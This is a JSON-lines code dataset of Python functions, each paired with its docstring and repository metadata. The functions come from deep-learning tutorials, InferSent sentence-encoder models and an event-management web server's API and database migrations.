{"docstring": "'''\n\u5c06\u5404\u4e2a\u6811\u8282\u70b9\u4e2d\u7684\u6570\u636e\u62fc\u63a5\u6210\u4e00\u4e2a\u957f\u5411\u91cf\n'''\n", "func_signal": "def concatenate(self, tree_nodes):\n", "code": "concat = np.zeros((0,1))\nfor node in tree_nodes:\n    concat = np.concatenate((concat, node.data))\nreturn concat", "path": "learn_dl/recursive.py", "commit_date": "2017-08-28 00:00:00", "repo_name": "hanbt/learn_dl", "stars": 1160, "license": "apache-2.0", "language": "python", "size": 41}
{"docstring": "'''\n\u8ba1\u7b97\u6bcf\u4e2a\u8282\u70b9\u7684delta\n'''\n", "func_signal": "def calc_delta(self, parent_delta, parent):\n", "code": "parent.delta = parent_delta\nif parent.children:\n    # \u6839\u636e\u5f0f2\u8ba1\u7b97\u6bcf\u4e2a\u5b50\u8282\u70b9\u7684delta\n    children_delta = np.dot(self.W.T, parent_delta) * (\n        self.activator.backward(parent.children_data)\n    )\n    # slices = [(\u5b50\u8282\u70b9\u7f16\u53f7\uff0c\u5b50\u8282\u70b9delta\u8d77\u59cb\u4f4d\u7f6e\uff0c\u5b50\u8282\u70b9delta\u7ed3\u675f\u4f4d\u7f6e)]\n    slices = [(i, i * self.node_width, \n                (i + 1) * self.node_width)\n                for i in range(self.child_count)]\n    # \u9488\u5bf9\u6bcf\u4e2a\u5b50\u8282\u70b9\uff0c\u9012\u5f52\u8c03\u7528calc_delta\u51fd\u6570\n    for s in slices:\n        self.calc_delta(children_delta[s[1]:s[2]], \n                        parent.children[s[0]])", "path": "learn_dl/recursive.py", "commit_date": "2017-08-28 00:00:00", "repo_name": "hanbt/learn_dl", "stars": 1160, "license": "apache-2.0", "language": "python", "size": 41}
{"docstring": "\"\"\"\n\u4e00\u6b21\u8fed\u4ee3\uff0c\u628a\u6240\u6709\u7684\u8bad\u7ec3\u6570\u636e\u8fc7\u4e00\u904d\n\"\"\"\n# \u628a\u8f93\u5165\u548c\u8f93\u51fa\u6253\u5305\u5728\u4e00\u8d77\uff0c\u6210\u4e3a\u6837\u672c\u7684\u5217\u8868[(input_vec, label), ...]\n# \u800c\u6bcf\u4e2a\u8bad\u7ec3\u6837\u672c\u662f(input_vec, label)\n", "func_signal": "def _one_iteration(self, input_vecs, labels, rate):\n", "code": "samples = zip(input_vecs, labels)\n# \u5bf9\u6bcf\u4e2a\u6837\u672c\uff0c\u6309\u7167\u611f\u77e5\u5668\u89c4\u5219\u66f4\u65b0\u6743\u91cd\nfor (input_vec, label) in samples:\n    # \u8ba1\u7b97\u611f\u77e5\u5668\u5728\u5f53\u524d\u6743\u91cd\u4e0b\u7684\u8f93\u51fa\n    output = self.predict(input_vec)\n    # \u66f4\u65b0\u6743\u91cd\n    self._update_weights(input_vec, output, label, rate)", "path": "learn_dl/perceptron.py", "commit_date": "2018-11-26 00:00:00", "repo_name": "hanbt/learn_dl", "stars": 1160, "license": "apache-2.0", "language": "python", "size": 41}
{"docstring": "# sent_len: [max_len, ..., min_len] (batch)\n# sent: Variable(seqlen x batch x worddim)\n\n", "func_signal": "def forward(self, sent_tuple):\n", "code": "sent, sent_len = sent_tuple\nbsize = sent.size(1)\n\nself.init_lstm = self.init_lstm if bsize == self.init_lstm.size(1) else \\\n        Variable(torch.FloatTensor(2, bsize, self.enc_lstm_dim).zero_()).cuda()\n\n# Sort by length (keep idx)\nsent_len, idx_sort = np.sort(sent_len)[::-1], np.argsort(-sent_len)\nsent = sent.index_select(1, Variable(torch.cuda.LongTensor(idx_sort)))\n# Handling padding in Recurrent Networks\nsent_packed = nn.utils.rnn.pack_padded_sequence(sent, sent_len)\nsent_output = self.enc_lstm(sent_packed,\n                            (self.init_lstm, self.init_lstm))[0]\n# seqlen x batch x 2*nhid\nsent_output = nn.utils.rnn.pad_packed_sequence(sent_output)[0]\n# Un-sort by length\nidx_unsort = np.argsort(idx_sort)\nsent_output = sent_output.index_select(1,\n    Variable(torch.cuda.LongTensor(idx_unsort)))\n\nsent_output = sent_output.transpose(0,1).contiguous()\nsent_output_proj = self.proj_lstm(sent_output.view(-1,\n    2*self.enc_lstm_dim)).view(bsize, -1, 2*self.enc_lstm_dim)\nsent_key_proj = self.proj_key(sent_output.view(-1,\n    2*self.enc_lstm_dim)).view(bsize, -1, 2*self.enc_lstm_dim)\nsent_key_proj = torch.tanh(sent_key_proj)\n# NAACL : u_it=tanh(W_w.h_it + b_w) like in NAACL paper\n\n# Temperature\nTemp = 3\n\nsent_w1 = self.query_embedding(Variable(torch.LongTensor(bsize*[0]).cuda())).unsqueeze(2) #(bsize, nhid, 1)\nkeys1 = sent_key_proj.bmm(sent_w1).squeeze(2) / Temp\nkeys1 = keys1 + ((keys1 == 0).float()*-1000)\nalphas1 = self.softmax(keys1).unsqueeze(2).expand_as(sent_key_proj)\nemb1 = torch.sum(alphas1 * sent_output_proj, 1).squeeze(1)\n\n\nsent_w2 = self.query_embedding(Variable(torch.LongTensor(bsize*[1]).cuda())).unsqueeze(2) #(bsize, nhid, 1)\nkeys2 = sent_key_proj.bmm(sent_w2).squeeze(2) / Temp\nkeys2 = keys2 + ((keys2 == 0).float()*-1000)\nalphas2 = self.softmax(keys2).unsqueeze(2).expand_as(sent_key_proj)\nemb2 = torch.sum(alphas2 * sent_output_proj, 1).squeeze(1)\n\nsent_w3 = self.query_embedding(Variable(torch.LongTensor(bsize*[1]).cuda())).unsqueeze(2) #(bsize, nhid, 1)\nkeys3 = sent_key_proj.bmm(sent_w3).squeeze(2) / Temp\nkeys3 = keys3 + ((keys3 == 0).float()*-1000)\nalphas3 = self.softmax(keys3).unsqueeze(2).expand_as(sent_key_proj)\nemb3 = torch.sum(alphas3 * sent_output_proj, 1).squeeze(1)\n\nsent_w4 = self.query_embedding(Variable(torch.LongTensor(bsize*[1]).cuda())).unsqueeze(2) #(bsize, nhid, 1)\nkeys4 = sent_key_proj.bmm(sent_w4).squeeze(2) / Temp\nkeys4 = keys4 + ((keys4 == 0).float()*-1000)\nalphas4 = self.softmax(keys4).unsqueeze(2).expand_as(sent_key_proj)\nemb4 = torch.sum(alphas4 * sent_output_proj, 1).squeeze(1)\n\n\nif int(time.time()) % 100 == 0:\n    print('alphas', torch.cat((alphas1.data[0, :, 0],\n                               alphas2.data[0, :, 0],\n                               torch.abs(alphas1.data[0, :, 0] -\n                                         alphas2.data[0, :, 0])), 1))\n\nemb = torch.cat((emb1, emb2, emb3, emb4), 1)\nreturn emb", "path": "nlp/aion/embeddings/infersent_lib/models.py", "commit_date": "2018-10-12 00:00:00", "repo_name": "makcedward/nlp", "stars": 1061, "license": "None", "language": "python", "size": 2297}
{"docstring": "# create vocab of words\n", "func_signal": "def get_word_dict(self, sentences, tokenize=True):\n", "code": "word_dict = {}\nsentences = [s.split() if not tokenize else self.tokenize(s) for s in sentences]\nfor sent in sentences:\n    for word in sent:\n        if word not in word_dict:\n            word_dict[word] = ''\nword_dict[self.bos] = ''\nword_dict[self.eos] = ''\nreturn word_dict", "path": "nlp/aion/embeddings/infersent_lib/models.py", "commit_date": "2018-10-12 00:00:00", "repo_name": "makcedward/nlp", "stars": 1061, "license": "None", "language": "python", "size": 2297}
{"docstring": "# sent_len: [max_len, ..., min_len] (batch)\n# sent: Variable(seqlen x batch x worddim)\n\n", "func_signal": "def forward(self, sent_tuple):\n", "code": "sent, sent_len = sent_tuple\nbsize = sent.size(1)\n\nself.init_lstm = self.init_lstm if bsize == self.init_lstm.size(1) else \\\n        Variable(torch.FloatTensor(2, bsize, self.enc_lstm_dim).zero_()).cuda()\n\n# Sort by length (keep idx)\nsent_len, idx_sort = np.sort(sent_len)[::-1], np.argsort(-sent_len)\nsent = sent.index_select(1, Variable(torch.cuda.LongTensor(idx_sort)))\n# Handling padding in Recurrent Networks\nsent_packed = nn.utils.rnn.pack_padded_sequence(sent, sent_len)\nsent_output = self.enc_lstm(sent_packed,\n                            (self.init_lstm, self.init_lstm))[0]\n# seqlen x batch x 2*nhid\nsent_output = nn.utils.rnn.pad_packed_sequence(sent_output)[0]\n# Un-sort by length\nidx_unsort = np.argsort(idx_sort)\nsent_output = sent_output.index_select(1,\n    Variable(torch.cuda.LongTensor(idx_unsort)))\n\nsent_output = sent_output.transpose(0,1).contiguous()\n\nsent_output_proj = self.proj_lstm(sent_output.view(-1,\n    2*self.enc_lstm_dim)).view(bsize, -1, 2*self.enc_lstm_dim)\n\nsent_keys = self.proj_enc(sent_output.view(-1,\n    2*self.enc_lstm_dim)).view(bsize, -1, 2*self.enc_lstm_dim)\n\nsent_max = torch.max(sent_output, 1)[0].squeeze(1)  # (bsize, 2*nhid)\nsent_summary = self.proj_query(\n               sent_max).unsqueeze(1).expand_as(sent_keys)\n# (bsize, seqlen, 2*nhid)\n\nsent_M = torch.tanh(sent_keys + sent_summary)\n# (bsize, seqlen, 2*nhid) YANG : M = tanh(Wh_i + Wh_avg\nsent_w = self.query_embedding(Variable(torch.LongTensor(\n    bsize*[0]).cuda())).unsqueeze(2)  # (bsize, 2*nhid, 1)\n\nsent_alphas = self.softmax(sent_M.bmm(sent_w).squeeze(2)).unsqueeze(1)\n# (bsize, 1, seqlen)\n\nif int(time.time()) % 200 == 0:\n    print('w', torch.max(sent_w[0]), torch.min(sent_w[0]))\n    print('alphas', sent_alphas[0][0][0:sent_len[0]])\n# Get attention vector\nemb = sent_alphas.bmm(sent_output_proj).squeeze(1)\n\nreturn emb", "path": "nlp/aion/embeddings/infersent_lib/models.py", "commit_date": "2018-10-12 00:00:00", "repo_name": "makcedward/nlp", "stars": 1061, "license": "None", "language": "python", "size": 2297}
{"docstring": "# sent_len: [max_len, ..., min_len] (batch)\n# sent: Variable(seqlen x batch x worddim)\n\n", "func_signal": "def forward(self, sent_tuple):\n", "code": "sent, sent_len = sent_tuple\n\nsent = sent.transpose(0,1).transpose(1,2).contiguous()\n# batch, nhid, seqlen)\n\nsent = self.convnet1(sent)\nu1 = torch.max(sent, 2)[0]\n\nsent = self.convnet2(sent)\nu2 = torch.max(sent, 2)[0]\n\nsent = self.convnet3(sent)\nu3 = torch.max(sent, 2)[0]\n\nsent = self.convnet4(sent)\nu4 = torch.max(sent, 2)[0]\n\nemb = torch.cat((u1, u2, u3, u4), 1)\n\nreturn emb", "path": "nlp/aion/embeddings/infersent_lib/models.py", "commit_date": "2018-10-12 00:00:00", "repo_name": "makcedward/nlp", "stars": 1061, "license": "None", "language": "python", "size": 2297}
{"docstring": "# sent_len: [max_len, ..., min_len] (batch)\n# sent: Variable(seqlen x batch x worddim)\n\n", "func_signal": "def forward(self, sent_tuple):\n", "code": "sent, sent_len = sent_tuple\nbsize = sent.size(1)\n\nself.init_lstm = self.init_lstm if bsize == self.init_lstm.size(1) else \\\n        Variable(torch.FloatTensor(2, bsize, self.enc_lstm_dim).zero_()).cuda()\n\n# Sort by length (keep idx)\nsent_len, idx_sort = np.sort(sent_len)[::-1], np.argsort(-sent_len)\nsent = sent.index_select(1, Variable(torch.cuda.LongTensor(idx_sort)))\n# Handling padding in Recurrent Networks\nsent_packed = nn.utils.rnn.pack_padded_sequence(sent, sent_len)\nsent_output = self.enc_lstm(sent_packed,\n                            (self.init_lstm, self.init_lstm))[0]\n# seqlen x batch x 2*nhid\nsent_output = nn.utils.rnn.pad_packed_sequence(sent_output)[0]\n# Un-sort by length\nidx_unsort = np.argsort(idx_sort)\nsent_output = sent_output.index_select(1, Variable(torch.cuda.LongTensor(idx_unsort)))\n\nsent_output = sent_output.transpose(0,1).contiguous()\n\nsent_output_proj = self.proj_lstm(sent_output.view(-1,\n    2*self.enc_lstm_dim)).view(bsize, -1, 2*self.enc_lstm_dim)\n\nsent_key_proj = self.proj_key(sent_output.view(-1,\n    2*self.enc_lstm_dim)).view(bsize, -1, 2*self.enc_lstm_dim)\n\nsent_key_proj = torch.tanh(sent_key_proj)\n# NAACL paper: u_it=tanh(W_w.h_it + b_w)  (bsize, seqlen, 2nhid)\n\nsent_w = self.query_embedding(Variable(torch.LongTensor(bsize*[0]).cuda())).unsqueeze(2) #(bsize, 2*nhid, 1)\n\nTemp = 2\nkeys = sent_key_proj.bmm(sent_w).squeeze(2) / Temp\n\n# Set probas of padding to zero in softmax\nkeys = keys + ((keys == 0).float()*-10000)\n\nalphas = self.softmax(keys/Temp).unsqueeze(2).expand_as(sent_output)\nif int(time.time()) % 100 == 0:\n    print('w', torch.max(sent_w), torch.min(sent_w))\n    print('alphas', alphas[0, :, 0])\nemb = torch.sum(alphas * sent_output_proj, 1).squeeze(1)\n\nreturn emb", "path": "nlp/aion/embeddings/infersent_lib/models.py", "commit_date": "2018-10-12 00:00:00", "repo_name": "makcedward/nlp", "stars": 1061, "license": "None", "language": "python", "size": 2297}
{"docstring": "#initial_capacity = len(corpus)\n\n#sym_spell = SymSpellPy(\n#    initial_capacity, max_edit_distance_dictionary, \n#    prefix_length)\n", "func_signal": "def load_vocab(self, corpus_file_path, max_edit_distance_dictionary=2, prefix_length=5):\n", "code": "self.model = SymSpellPy(\n    max_dictionary_edit_distance=max_edit_distance_dictionary, \n    prefix_length=prefix_length)\n\nterm_index = 0  # column of the term in the dictionary text file\ncount_index = 1  # column of the term frequency in the dictionary text file\nif not self.model.load_dictionary(corpus_file_path, term_index, count_index):\n    print(\"Dictionary file not found\")", "path": "nlp/aion/util/spell_check.py", "commit_date": "2018-11-10 00:00:00", "repo_name": "makcedward/nlp", "stars": 1061, "license": "None", "language": "python", "size": 2297}
{"docstring": "# Source: https://github.com/strongio/keras-elmo/blob/master/Elmo%20Keras.ipynb\n", "func_signal": "def to_keras_layer(self, x):\n", "code": "'''\n    For signature and layer parameters, you can visit https://alpha.tfhub.dev/google/elmo/2\n'''        \nreturn self.model(\n    tf.squeeze(tf.cast(x, tf.string)), \n    signature=\"default\", as_dict=True)[self.layer]", "path": "nlp/aion/embeddings/elmo.py", "commit_date": "2018-10-12 00:00:00", "repo_name": "makcedward/nlp", "stars": 1061, "license": "None", "language": "python", "size": 2297}
{"docstring": "# sent_len: [max_len, ..., min_len] (batch)\n# sent: Variable(seqlen x batch x worddim)\n\n", "func_signal": "def forward(self, sent_tuple):\n", "code": "sent, sent_len = sent_tuple\nbsize = sent.size(1)\n\nself.init_lstm = self.init_lstm if bsize == self.init_lstm.size(1) else \\\n        Variable(torch.FloatTensor(1, bsize, self.enc_lstm_dim).zero_()).cuda()\n\n# Sort by length (keep idx)\nsent_len, idx_sort = np.sort(sent_len)[::-1], np.argsort(-sent_len)\nsent = sent.index_select(1, Variable(torch.cuda.LongTensor(idx_sort)))\n\n# Handling padding in Recurrent Networks\nsent_packed = nn.utils.rnn.pack_padded_sequence(sent, sent_len)\n\nsent_output = self.enc_lstm(sent_packed, self.init_lstm)[1].squeeze(0)\n# batch x 2*nhid\n\n# Un-sort by length\nidx_unsort = np.argsort(idx_sort)\nemb = sent_output.index_select(0, Variable(torch.cuda.LongTensor(idx_unsort)))\n\nreturn emb", "path": "nlp/aion/embeddings/infersent_lib/models.py", "commit_date": "2018-10-12 00:00:00", "repo_name": "makcedward/nlp", "stars": 1061, "license": "None", "language": "python", "size": 2297}
{"docstring": "# sent_len: [max_len, ..., min_len] (bsize)\n# sent: Variable(seqlen x bsize x worddim)\n", "func_signal": "def forward(self, sent_tuple):\n", "code": "sent, sent_len = sent_tuple\n\n# Sort by length (keep idx)\nsent_len_sorted, idx_sort = np.sort(sent_len)[::-1], np.argsort(-sent_len)\nidx_unsort = np.argsort(idx_sort)\n\nidx_sort = torch.from_numpy(idx_sort).cuda() if self.is_cuda() \\\n    else torch.from_numpy(idx_sort)\nsent = sent.index_select(1, Variable(idx_sort))\n\n# Handling padding in Recurrent Networks\nsent_packed = nn.utils.rnn.pack_padded_sequence(sent, sent_len_sorted)\nsent_output = self.enc_lstm(sent_packed)[0]  # seqlen x batch x 2*nhid\nsent_output = nn.utils.rnn.pad_packed_sequence(sent_output)[0]\n\n# Un-sort by length\nidx_unsort = torch.from_numpy(idx_unsort).cuda() if self.is_cuda() \\\n    else torch.from_numpy(idx_unsort)\nsent_output = sent_output.index_select(1, Variable(idx_unsort))\n\n# Pooling\nif self.pool_type == \"mean\":\n    sent_len = Variable(torch.FloatTensor(sent_len.copy())).unsqueeze(1).cuda()\n    emb = torch.sum(sent_output, 0).squeeze(0)\n    emb = emb / sent_len.expand_as(emb)\nelif self.pool_type == \"max\":\n    if not self.max_pad:\n        sent_output[sent_output == 0] = -1e9\n    emb = torch.max(sent_output, 0)[0]\n    if emb.ndimension() == 3:\n        emb = emb.squeeze(0)\n        assert emb.ndimension() == 2\n\nreturn emb", "path": "nlp/aion/embeddings/infersent_lib/models.py", "commit_date": "2018-10-12 00:00:00", "repo_name": "makcedward/nlp", "stars": 1061, "license": "None", "language": "python", "size": 2297}
{"docstring": "# s1 : (s1, s1_len)\n", "func_signal": "def forward(self, s1):\n", "code": "u = self.encoder(s1)\n\noutput = self.classifier(u)\nreturn output", "path": "nlp/aion/embeddings/infersent_lib/models.py", "commit_date": "2018-10-12 00:00:00", "repo_name": "makcedward/nlp", "stars": 1061, "license": "None", "language": "python", "size": 2297}
{"docstring": "# sent_len: [max_len, ..., min_len] (batch)\n# sent: Variable(seqlen x batch x worddim)\n\n", "func_signal": "def forward(self, sent_tuple):\n", "code": "sent, sent_len = sent_tuple\nbsize = sent.size(1)\n\nself.init_lstm = self.init_lstm if bsize == self.init_lstm.size(1) else \\\n        Variable(torch.FloatTensor(2, bsize, self.enc_lstm_dim).zero_()).cuda()\n\n# Sort by length (keep idx)\nsent_len, idx_sort = np.sort(sent_len)[::-1], np.argsort(-sent_len)\nsent = sent.index_select(1, Variable(torch.cuda.LongTensor(idx_sort)))\n\n# Handling padding in Recurrent Networks\nsent_packed = nn.utils.rnn.pack_padded_sequence(sent, sent_len)\nsent_output = self.enc_lstm(sent_packed,\n                            (self.init_lstm, self.init_lstm))[0]\n# seqlen x batch x 2*nhid\nsent_output = nn.utils.rnn.pad_packed_sequence(sent_output)[0]\n\n# Un-sort by length\nidx_unsort = np.argsort(idx_sort)\nsent_output = sent_output.index_select(1,\n        Variable(torch.cuda.LongTensor(idx_unsort)))\n\nsent_output = self.proj_enc(sent_output.view(-1,\n    2*self.enc_lstm_dim)).view(-1, bsize, 2*self.enc_lstm_dim)\n# Pooling\nif self.pool_type == \"mean\":\n    sent_len = Variable(torch.FloatTensor(sent_len)).unsqueeze(1).cuda()\n    emb = torch.sum(sent_output, 0).squeeze(0)\n    emb = emb / sent_len.expand_as(emb)\nelif self.pool_type == \"max\":\n    emb = torch.max(sent_output, 0)[0].squeeze(0)\n\nreturn emb", "path": "nlp/aion/embeddings/infersent_lib/models.py", "commit_date": "2018-10-12 00:00:00", "repo_name": "makcedward/nlp", "stars": 1061, "license": "None", "language": "python", "size": 2297}
{"docstring": "# s1 : (s1, s1_len)\n", "func_signal": "def forward(self, s1, s2):\n", "code": "u = self.encoder(s1)\nv = self.encoder(s2)\n\nfeatures = torch.cat((u, v, torch.abs(u-v), u*v), 1)\noutput = self.classifier(features)\nreturn output", "path": "nlp/aion/embeddings/infersent_lib/models.py", "commit_date": "2018-10-12 00:00:00", "repo_name": "makcedward/nlp", "stars": 1061, "license": "None", "language": "python", "size": 2297}
{"docstring": "# sent in batch in decreasing order of lengths (bsize, max_len, word_dim)\n", "func_signal": "def get_batch(batch, word_vec, emb_dim=300):\n", "code": "lengths = np.array([len(x) for x in batch])\nmax_len = np.max(lengths)\nembed = np.zeros((max_len, len(batch), emb_dim))\n\nfor i in range(len(batch)):\n    for j in range(len(batch[i])):\n        embed[j, i, :] = word_vec[batch[i][j]]\n\nreturn torch.from_numpy(embed).float(), lengths", "path": "nlp/aion/embeddings/infersent_lib/data.py", "commit_date": "2018-10-12 00:00:00", "repo_name": "makcedward/nlp", "stars": 1061, "license": "None", "language": "python", "size": 2297}
{"docstring": "# sent_len: [max_len, ..., min_len] (batch)\n# sent: Variable(seqlen x batch x worddim)\n\n", "func_signal": "def forward(self, sent_tuple):\n", "code": "sent, sent_len = sent_tuple\nbsize = sent.size(1)\n\nself.init_lstm = self.init_lstm if bsize == self.init_lstm.size(1) else \\\n        Variable(torch.FloatTensor(2, bsize, self.enc_lstm_dim).zero_()).cuda()\n\n# Sort by length (keep idx)\nsent_len, idx_sort = np.sort(sent_len)[::-1], np.argsort(-sent_len)\nsent = sent.index_select(1, Variable(torch.cuda.LongTensor(idx_sort)))\n\n# Handling padding in Recurrent Networks\nsent_packed = nn.utils.rnn.pack_padded_sequence(sent, sent_len)\n_, hn = self.enc_lstm(sent_packed, self.init_lstm)\nemb = torch.cat((hn[0], hn[1]), 1)  # batch x 2*nhid\n\n# Un-sort by length\nidx_unsort = np.argsort(idx_sort)\nemb = emb.index_select(0, Variable(torch.cuda.LongTensor(idx_unsort)))\n\nreturn emb", "path": "nlp/aion/embeddings/infersent_lib/models.py", "commit_date": "2018-10-12 00:00:00", "repo_name": "makcedward/nlp", "stars": 1061, "license": "None", "language": "python", "size": 2297}
{"docstring": "# sent in batch in decreasing order of lengths\n# batch: (bsize, max_len, word_dim)\n", "func_signal": "def get_batch(self, batch):\n", "code": "embed = np.zeros((len(batch[0]), len(batch), self.word_emb_dim))\n\nfor i in range(len(batch)):\n    for j in range(len(batch[i])):\n        embed[j, i, :] = self.word_vec[batch[i][j]]\n\nreturn torch.FloatTensor(embed)", "path": "nlp/aion/embeddings/infersent_lib/models.py", "commit_date": "2018-10-12 00:00:00", "repo_name": "makcedward/nlp", "stars": 1061, "license": "None", "language": "python", "size": 2297}
{"docstring": "# TODO: Support V2 model\n", "func_signal": "def load_model(self, dest_dir, src=None, trainable=True, verbose=0):\n", "code": "if src is None:\n    src = InferSentEmbeddings.INFERSENT_GLOVE_MODEL_URL\n    \ndest_file = os.path.basename(src)\nfile_path = self.download(\n    src=src, dest_dir=dest_dir, dest_file=dest_file, \n    uncompress=False, housekeep=False, verbose=verbose)\n    \nself.model = InferSent(self.get_params())\nself.model.load_state_dict(torch.load(dest_dir + dest_file))\n\n# TODO: support different glove model and fasttext model\nword_embs = GloVeEmbeddings()\nword_embs.load_model(dest_dir=self.word_embeddings_dir, process=False, verbose=verbose)\n\nself.model.set_w2v_path(word_embs.model_path)", "path": "nlp/aion/embeddings/infersent.py", "commit_date": "2018-10-30 00:00:00", "repo_name": "makcedward/nlp", "stars": 1061, "license": "None", "language": "python", "size": 2297}
{"docstring": "# create word_vec with glove vectors\n", "func_signal": "def get_glove(word_dict, glove_path):\n", "code": "word_vec = {}\nwith open(glove_path) as f:\n    for line in f:\n        word, vec = line.split(' ', 1)\n        if word in word_dict:\n            word_vec[word] = np.array(list(map(float, vec.split())))\nprint('Found {0}(/{1}) words with glove vectors'.format(\n            len(word_vec), len(word_dict)))\nreturn word_vec", "path": "nlp/aion/embeddings/infersent_lib/data.py", "commit_date": "2018-10-12 00:00:00", "repo_name": "makcedward/nlp", "stars": 1061, "license": "None", "language": "python", "size": 2297}
{"docstring": "# batch contains list of words\n", "func_signal": "def batcher(batch, params):\n", "code": "batch = [['<s>'] + s + ['</s>'] for s in batch]\nsentences = [' '.join(s) for s in batch]\nembeddings = params.infersent.encode(sentences, bsize=params.batch_size,\n                                     tokenize=False)\n\nreturn embeddings", "path": "nlp/aion/embeddings/infersent_lib/mutils.py", "commit_date": "2018-10-12 00:00:00", "repo_name": "makcedward/nlp", "stars": 1061, "license": "None", "language": "python", "size": 2297}
{"docstring": "# create vocab of words\n", "func_signal": "def get_word_dict(sentences):\n", "code": "word_dict = {}\nfor sent in sentences:\n    for word in sent.split():\n        if word not in word_dict:\n            word_dict[word] = ''\nword_dict['<s>'] = ''\nword_dict['</s>'] = ''\nword_dict['<p>'] = ''\nreturn word_dict", "path": "nlp/aion/embeddings/infersent_lib/data.py", "commit_date": "2018-10-12 00:00:00", "repo_name": "makcedward/nlp", "stars": 1061, "license": "None", "language": "python", "size": 2297}
{"docstring": "\"\"\"\nParse optimizer parameters.\nInput should be of the form:\n    - \"sgd,lr=0.01\"\n    - \"adagrad,lr=0.1,lr_decay=0.05\"\n\"\"\"\n", "func_signal": "def get_optimizer(s):\n", "code": "if \",\" in s:\n    method = s[:s.find(',')]\n    optim_params = {}\n    for x in s[s.find(',') + 1:].split(','):\n        split = x.split('=')\n        assert len(split) == 2\n        assert re.match(\"^[+-]?(\\d+(\\.\\d*)?|\\.\\d+)$\", split[1]) is not None\n        optim_params[split[0]] = float(split[1])\nelse:\n    method = s\n    optim_params = {}\n\nif method == 'adadelta':\n    optim_fn = optim.Adadelta\nelif method == 'adagrad':\n    optim_fn = optim.Adagrad\nelif method == 'adam':\n    optim_fn = optim.Adam\nelif method == 'adamax':\n    optim_fn = optim.Adamax\nelif method == 'asgd':\n    optim_fn = optim.ASGD\nelif method == 'rmsprop':\n    optim_fn = optim.RMSprop\nelif method == 'rprop':\n    optim_fn = optim.Rprop\nelif method == 'sgd':\n    optim_fn = optim.SGD\n    assert 'lr' in optim_params\nelse:\n    raise Exception('Unknown optimization method: \"%s\"' % method)\n\n# check that we give good parameters to the optimizer\nexpected_args = inspect.getargspec(optim_fn.__init__)[0]\nassert expected_args[:2] == ['self', 'params']\nif not all(k in expected_args[2:] for k in optim_params.keys()):\n    raise Exception('Unexpected parameters: expected \"%s\", got \"%s\"' % (\n        str(expected_args[2:]), str(optim_params.keys())))\n\nreturn optim_fn, optim_params", "path": "nlp/aion/embeddings/infersent_lib/mutils.py", "commit_date": "2018-10-12 00:00:00", "repo_name": "makcedward/nlp", "stars": 1061, "license": "None", "language": "python", "size": 2297}
{"docstring": "\"\"\"\nGenerate hash for key\n\"\"\"\n", "func_signal": "def generate_hash(key):\n", "code": "phash = generate_password_hash(key, get_settings()['secret'])\nreturn b64encode(phash)[:10]  # limit len to 10, is sufficient", "path": "open-event-server/app/api/helpers/storage.py", "commit_date": "2017-08-14 00:00:00", "repo_name": "OpnTec/open-event-server", "stars": 1232, "license": "gpl-3.0", "language": "python", "size": 39199}
{"docstring": "\"\"\"\nbefore post method to check for required relationship and proper permission\n:param args:\n:param kwargs:\n:param data:\n:return:\n\"\"\"\n", "func_signal": "def before_post(self, args, kwargs, data):\n", "code": "require_relationship(['event'], data)\ndata['creator_id'] = current_identity.id", "path": "open-event-server/app/api/sessions.py", "commit_date": "2017-08-29 00:00:00", "repo_name": "OpnTec/open-event-server", "stars": 1232, "license": "gpl-3.0", "language": "python", "size": 39199}
{"docstring": "### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def upgrade():\n", "code": "op.create_table('custom_placeholder',\nsa.Column('id', sa.Integer(), nullable=False),\nsa.Column('name', sa.String(), nullable=True),\nsa.Column('url', sa.String(), nullable=True),\nsa.PrimaryKeyConstraint('id')\n)\n### end Alembic commands ###", "path": "open-event-server/migrations/versions/90a9f0908326_.py", "commit_date": "2016-08-18 00:00:00", "repo_name": "OpnTec/open-event-server", "stars": 1232, "license": "gpl-3.0", "language": "python", "size": 39199}
{"docstring": "\"\"\"\nquery method for Sponsor List\n:param view_kwargs:\n:return:\n\"\"\"\n", "func_signal": "def query(self, view_kwargs):\n", "code": "query_ = self.session.query(Sponsor)\nquery_ = event_query(self, query_, view_kwargs)\nreturn query_", "path": "open-event-server/app/api/sponsors.py", "commit_date": "2017-08-29 00:00:00", "repo_name": "OpnTec/open-event-server", "stars": 1232, "license": "gpl-3.0", "language": "python", "size": 39199}
{"docstring": "### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def downgrade():\n", "code": "op.drop_column('events_version', 'payment_currency')\nop.drop_column('events_version', 'payment_country')\nop.drop_column('events', 'payment_currency')\nop.drop_column('events', 'payment_country')\n### end Alembic commands ###", "path": "open-event-server/migrations/versions/7cf31ed98b0c_.py", "commit_date": "2016-07-28 00:00:00", "repo_name": "OpnTec/open-event-server", "stars": 1232, "license": "gpl-3.0", "language": "python", "size": 39199}
{"docstring": "\"\"\"\nbefore post method to check for required relationship and proper permission\n:param args:\n:param kwargs:\n:param data:\n:return:\n\"\"\"\n", "func_signal": "def before_post(self, args, kwargs, data):\n", "code": "require_relationship(['event'], data)\nif not has_access('is_coorganizer', event_id=data['event']):\n    raise ForbiddenException({'source': ''}, 'Co-organizer access is required.')", "path": "open-event-server/app/api/sponsors.py", "commit_date": "2017-08-29 00:00:00", "repo_name": "OpnTec/open-event-server", "stars": 1232, "license": "gpl-3.0", "language": "python", "size": 39199}
{"docstring": "\"\"\"\nbefore get method to get the resource id for fetching details\n:param view_kwargs:\n:return:\n\"\"\"\n", "func_signal": "def before_get_object(self, view_kwargs):\n", "code": "if view_kwargs.get('event_identifier'):\n    event = safe_query(self, Event, 'identifier', view_kwargs['event_identifier'], 'identifier')\n    view_kwargs['event_id'] = event.id", "path": "open-event-server/app/api/sessions.py", "commit_date": "2017-08-29 00:00:00", "repo_name": "OpnTec/open-event-server", "stars": 1232, "license": "gpl-3.0", "language": "python", "size": 39199}
{"docstring": "### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def upgrade():\n", "code": "op.add_column('events', sa.Column('payment_country', sa.String(), nullable=True))\nop.add_column('events', sa.Column('payment_currency', sa.String(), nullable=True))\nop.add_column('events_version', sa.Column('payment_country', sa.String(), autoincrement=False, nullable=True))\nop.add_column('events_version', sa.Column('payment_currency', sa.String(), autoincrement=False, nullable=True))\n### end Alembic commands ###", "path": "open-event-server/migrations/versions/7cf31ed98b0c_.py", "commit_date": "2016-07-28 00:00:00", "repo_name": "OpnTec/open-event-server", "stars": 1232, "license": "gpl-3.0", "language": "python", "size": 39199}
